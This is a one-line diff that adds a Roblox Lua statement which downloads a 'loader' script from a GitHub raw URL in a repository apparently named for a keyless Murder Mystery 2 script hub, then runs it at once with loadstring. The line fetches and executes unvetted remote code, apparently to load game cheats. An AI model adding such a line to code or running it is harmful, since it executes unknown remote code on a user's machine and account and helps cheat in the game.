@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nullwraith-t100/MM2-keylezz/refs/heads/main/loader"))()
